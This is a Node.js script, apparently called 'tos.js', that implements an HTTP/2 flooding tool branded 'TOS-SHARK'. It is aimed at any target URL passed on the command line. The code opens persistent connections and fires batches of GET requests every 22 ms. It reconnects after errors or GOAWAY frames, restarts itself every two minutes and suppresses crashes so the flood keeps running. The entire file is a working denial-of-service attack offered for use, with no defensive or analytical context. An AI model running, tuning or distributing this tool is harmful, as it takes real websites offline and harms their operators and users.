const http2 = require('http2');
const { URL } = require('url');

class TOS_SHARK_OPTIMIZED {
    constructor(target) {
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.activeConns = 2; // REDUCED from 7
        this.reqsPerBatch = 45; // REDUCED from 125
        this.batchDelay = 22; // ms between batches
        
        this.colors = {
            reset: '\x1b[0m',
            magenta: '\x1b[35m',
            green: '\x1b[92m',
            red: '\x1b[91m'
        };
        
        this.startEngine();
        this.startAutoRestart();
    }
    
    startEngine() {
        // Single connection pool - more efficient
        this.connPool = [];
        for (let i = 0; i < this.activeConns; i++) {
            this.createConnection(i);
        }
        
        // Efficient batch scheduler
        this.batchInterval = setInterval(() => {
            if (!this.running) return;
            this.sendEfficientBatch();
        }, this.batchDelay);
        
        // Stats logger
        this.logInterval = setInterval(() => {
            console.log(`${this.colors.magenta}TOS-SHARK${this.colors.reset}:${this.colors.green}${this.totalReqs}${this.colors.reset}`);
            this.totalReqs = 0;
        }, 10000);
    }
    
    createConnection(id) {
        try {
            const client = http2.connect(this.target, {
                maxSessionMemory: 512 * 512, // REDUCED memory
                peerMaxConcurrentStreams: 100
            });
            
            client.on('error', () => {
                setTimeout(() => this.createConnection(id), 1000);
            });
            
            client.on('goaway', () => {
                setTimeout(() => this.createConnection(id), 1000);
            });
            
            this.connPool[id] = client;
        } catch (e) {
            setTimeout(() => this.createConnection(id), 2000);
        }
    }
    
    sendEfficientBatch() {
        // Send minimal requests to reduce device load
        for (let i = 0; i < this.activeConns; i++) {
            const client = this.connPool[i];
            if (client && client.socket && !client.destroyed) {
                for (let j = 0; j < this.reqsPerBatch; j++) {
                    this.sendLightRequest(client);
                }
            }
        }
    }
    
    sendLightRequest(client) {
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': new URL(this.target).hostname
            });
            
            req.on('response', () => {
                this.totalReqs++;
                req.close(); // CLOSE IMMEDIATELY to free memory
            });
            
            req.on('error', () => {
                req.close();
            });
            
            req.end();
        } catch (e) {
            // Silent fail
        }
    }
    
    startAutoRestart() {
        // Auto-restart every 2 minutes to prevent GC crashes
        setInterval(() => {
            console.log(`${this.colors.green}[AUTO-RESTARTING]${this.colors.reset}`);
            this.restartEngine();
        }, 120000);
    }
    
    restartEngine() {
        // Clean restart
        clearInterval(this.batchInterval);
        clearInterval(this.logInterval);
        
        // Close old connections
        this.connPool.forEach(client => {
            try {
                if (client && !client.destroyed) client.destroy();
            } catch (e) {}
        });
        
        // Restart fresh
        setTimeout(() => {
            this.totalReqs = 0;
            this.startEngine();
        }, 1000);
    }
    
    stop() {
        this.running = false;
        clearInterval(this.batchInterval);
        clearInterval(this.logInterval);
        this.connPool.forEach(client => {
            try {
                if (client && !client.destroyed) client.destroy();
            } catch (e) {}
        });
    }
}

// RUN WITH AUTO-RECOVERY
if (require.main === module) {
    process.on('uncaughtException', () => {
        console.log('[*] Auto-recovering...');
        setTimeout(() => main(), 3000);
    });
    
    process.on('unhandledRejection', () => {});
    
    require('v8').setFlagsFromString('--max-old-space-size=2048');
    
    function main() {
        if (process.argv.length < 3) {
            console.log('Usage: node tos.js https://target.com');
            process.exit(1);
        }
        
        const shark = new TOS_SHARK_OPTIMIZED(process.argv[2]);
        
        process.on('SIGINT', () => {
            shark.stop();
            console.log('\nStopped.');
            process.exit(0);
        });
    }
    
    main();
}
